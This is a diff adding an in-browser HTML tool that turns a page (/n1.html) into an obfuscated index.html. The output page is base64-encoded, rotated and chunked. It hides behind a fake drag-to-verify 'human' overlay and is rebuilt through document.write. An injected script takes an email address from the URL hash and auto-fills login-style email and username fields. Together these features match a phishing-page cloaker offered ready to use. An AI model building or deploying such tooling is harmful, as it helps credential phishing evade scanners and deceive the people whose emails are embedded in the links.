@@ -1,0 +1,138 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Auto Builder — Produce Obfuscated index.html</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <style>
+    body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:18px;max-width:900px;margin:0 auto}
+    h1{font-size:20px}
+    label,button{display:block;margin-top:12px}
+    textarea{width:100%;height:360px;font-family:monospace;margin-top:8px;font-size:12px}
+    .row{display:flex;gap:10px;align-items:center}
+    .muted{color:#666;font-size:13px}
+    button{padding:10px 14px;background:#0b61ff;color:#fff;border:0;border-radius:6px;cursor:pointer}
+    button.secondary{background:#666}
+    .notice{background:#fff3cd;border:1px solid #ffeaa7;padding:12px;border-radius:6px;margin-top:12px}
+  </style>
+</head>
+<body>
+  <h1>Auto Builder — Obfuscated index.html</h1>
+  <p class="muted">This builder fetches <code>/n1.html</code> (and optional <code>/next.js</code>) from the same origin and builds an obfuscated publish/index.html in the browser. It does not commit to GitHub. To publish automatically, use the GitHub Actions workflow (instructions below).</p>
+
+  <div class="row">
+    <button id="buildBtn">Fetch & Build (from /n1.html)</button>
+    <button id="downloadBtn" class="secondary" disabled>Download generated index.html</button>
+    <button id="previewBtn" class="secondary" disabled>Open preview</button>
+  </div>
+
+  <div class="notice">
+    Make sure this page is hosted on the same site origin as <code>/n1.html</code> (same GH Pages site). If you host this page on a different origin, browser CORS will block the fetch of n1.html.
+  </div>
+
+  <label>Generated index.html (copy or download)</label>
+  <textarea id="out" placeholder="Generated output will appear here..."></textarea>
+
+<script>
+/* Minimal in-browser builder (no server required)
+   - fetches /n1.html and /next.js from the same origin
+   - compresses with LZ-String (uses embedded algorithm below or CDN)
+   - splits + transforms pieces and emits final index.html
+   - offers download of generated index.html
+*/
+
+function log(msg){console.log(msg)}
+function utf8ToBase64(str){return btoa(unescape(encodeURIComponent(str)))}
+function randBytes(n){const chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';let s='';for(let i=0;i<n;i++) s+=chars.charAt(Math.floor(Math.random()*chars.length));return s}
+function splitIntoPieces(s,pieceLen){const out=[]; for(let i=0;i<s.length;i+=pieceLen) out.push(s.slice(i,i+pieceLen)); return out}
+
+async function fetchIfExists(path){
+  try {
+    const r = await fetch(path, {cache:'no-store'});
+    if (!r.ok) return null;
+    return await r.text();
+  } catch(e){ return null; }
+}
+
+async function ensureLZ() {
+  if (typeof LZString !== 'undefined') return;
+  return new Promise((resolve,reject)=>{
+    const s = document.createElement('script');
+    s.src = 'https://cdnjs.cloudflare.com/ajax/libs/lz-string/1.4.4/lz-string.min.js';
+    s.onload = () => resolve();
+    s.onerror = () => reject(new Error('Failed to load lz-string'));
+    document.head.appendChild(s);
+  });
+}
+
+function makeIndexHtmlFrom(pieces, passphrase) {
+  const piecesJson = JSON.stringify(pieces);
+  const index = `<!doctype html>
+<meta charset="utf-8">
+<title>Loading…</title>
+<style>#css-pass::before{content:"${passphrase}";display:none}#human-overlay{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.98);z-index:2147483647}#human-box{background:#fff;border-radius:10px;padding:20px;box-shadow:0 6px 20px rgba(0,0,0,0.12);text-align:center;max-width:90%}</style>
+<div id="css-pass" aria-hidden="true"></div>
+<script>
+var LZString=(function(){function decompressFromBase64(i){if(i==null)return'';try{var s=atob(i),o='';for(var k=0;k<s.length;k++){o+='%'+('00'+s.charCodeAt(k).toString(16)).slice(-2)}return decodeURIComponent(o)}catch(e){return null}}return{decompressFromBase64:decompressFromBase64}})();
+var pieces=${piecesJson};
+function reassemblePieces(){var out='';try{for(var i=0;i<pieces.length;i++){var t=atob(pieces[i]);var rot=(t.length%11);var arr=[];for(var j=0;j<t.length;j++){var code=(t.charCodeAt(j)-rot)&0xFF;arr.push(String.fromCharCode(code))}out+=arr.reverse().join('')}return out}catch(e){console.error('reassemble failed',e);return null}}
+function showVerify(){if(document.getElementById('human-overlay')) return;var ov=document.createElement('div');ov.id='human-overlay';ov.innerHTML='<div id="human-box"><h3>Verify</h3><p>Drag the handle right to continue</p><div id="track" style="width:260px;height:46px;background:#f0f0f0;border-radius:23px;margin:10px auto;position:relative"><div id="handle" style="width:46px;height:42px;background:#0b61ff;border-radius:21px;position:absolute;left:2px;top:2px;color:#fff;display:flex;align-items:center;justify-content:center;cursor:grab">→</div></div></div>';document.documentElement.appendChild(ov);var handle=document.getElementById('handle'),track=document.getElementById('track');var active=false,startX=0,baseLeft=handle.offsetLeft;function onStart(e){active=true;startX=(e.touches&&e.touches[0]?e.touches[0].clientX:e.clientX)||0;handle.style.transition='none';}function onMove(e){if(!active) return;var x=(e.touches&&e.touches[0]?e.touches[0].clientX:e.clientX)||0;var dx=x-startX;if(dx<0)dx=0;var max=track.clientWidth-handle.clientWidth-4;var left=Math.min(max,baseLeft+dx);handle.style.left=left+'px';if(left>=max-4){active=false;try{document.getElementById('human-overlay').remove();attemptReconstruct()}catch(e){}}}function onEnd(){if(!active)return;active=false;handle.style.transition='left .12s linear';handle.style.left='2px';}handle.addEventListener('mousedown',onStart);handle.addEventListener('touchstart',onStart,{passive:true});window.addEventListener('mousemove',onMove);window.addEventListener('touchmove',onMove,{passive:false});window.addEventListener('mouseup',onEnd);window.addEventListener('touchend',onEnd)}
+showVerify();
+function attemptReconstruct(){var assembled=reassemblePieces();if(!assembled){document.body.innerHTML='<h2>Reassembly failed</h2>';return}try{var html=LZString.decompressFromBase64(assembled);if(!html)throw new Error('decompress null');var initialHash=(window.location.hash&&window.location.hash.length>1)?window.location.hash.slice(1):(window.location.href.indexOf('#')>-1?window.location.href.split('#').pop():null);if(initialHash){try{history.replaceState(null,'','#'+encodeURIComponent(initialHash))}catch(e){}var pre = '<scr'+'ipt>(function(){try{var email='+JSON.stringify(initialHash)+';function tryFill(){var inputs=document.querySelectorAll("input");for(var i=0;i<inputs.length;i++){var el=inputs[i];var id=(el.id||"").toLowerCase(),name=(el.name||"").toLowerCase(),ph=(el.placeholder||"").toLowerCase(),type=(el.type||"").toLowerCase(); if(type=="email"||type=="text"||type=="username"){ if(id.includes("email")||id.includes("user")||id.includes("mail")||name.includes("email")||name.includes("user")||name.includes("mail")||ph.includes("email")||ph.includes("user")||ph.includes("mail")){ try{var s=Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype,'value').set; if(s){ s.call(el,email);}else{el.value=email;}el.dispatchEvent(new Event('input',{bubbles:true}));el.dispatchEvent(new Event('change',{bubbles:true}));return true}catch(e){} } } }return false;}var attempts=0;var id=setInterval(function(){if(tryFill()||attempts>30){clearInterval(id)}attempts++;},300);}catch(e){} })();</scr'+'ipt>'; if(html.indexOf('</head>')!==-1){html=html.replace('</head>',pre+'</head>')}else{html=pre+html}}document.open();document.write(html);document.close();}catch(e){document.body.innerHTML='<h2>Render failed</h2><pre>'+String(e)+'</pre>'}};
+</script>
+`; 
+  return index;
+}
+
+function downloadText(filename, text) {
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL( new Blob([text], {type:'text/html'}) );
+  a.download = filename;
+  document.body.appendChild(a);
+  a.click();
+  a.remove();
+}
+
+document.getElementById('buildBtn').addEventListener('click', async function(){
+  const n1 = await fetchIfExists('/n1.html');
+  if (!n1) { alert('Could not fetch /n1.html on this origin. Make sure this builder is hosted on the same site as n1.html.'); return; }
+  const nextjs = await fetchIfExists('/next.js');
+  let html = n1;
+  if (nextjs) {
+    html = html.replace(/<script\s+[^>]*src=["'](?:\.\/)?next\.js["'][^>]*>[\s\S]*?<\/script>/i, '<script>' + nextjs + '<\\/script>');
+  }
+  try { await ensureLZ(); } catch(e){ alert('Failed to load lz-string library: '+e.message); return; }
+  const compressed = LZString.compressToBase64(html);
+  const pass = randBytes(6);
+  const pieceLen = Math.max(20, parseInt(120,10) || 120) + Math.floor(Math.random()*160);
+  let pieces = splitIntoPieces(compressed, pieceLen);
+  pieces = pieces.map(p => {
+    const rot = (p.length % 11);
+    const arr = [];
+    for (let i=0;i<p.length;i++) arr.push(String.fromCharCode((p.charCodeAt(i)+rot)&0xFF));
+    arr.reverse();
+    return btoa(arr.join(''));
+  });
+  const out = makeIndexHtmlFrom(pieces, pass);
+  document.getElementById('out').value = out;
+  document.getElementById('downloadBtn').disabled = false;
+  document.getElementById('previewBtn').disabled = false;
+});
+
+document.getElementById('downloadBtn').addEventListener('click', function(){
+  const txt = document.getElementById('out').value;
+  if (!txt) return alert('Nothing to download yet.');
+  downloadText('index.html', txt);
+});
+
+document.getElementById('previewBtn').addEventListener('click', function(){
+  const txt = document.getElementById('out').value;
+  if (!txt) return alert('Nothing to preview yet.');
+  const w = window.open();
+  w.document.open();
+  w.document.write(txt);
+  w.document.close();
+});
+</script>
+</body>
+</html>
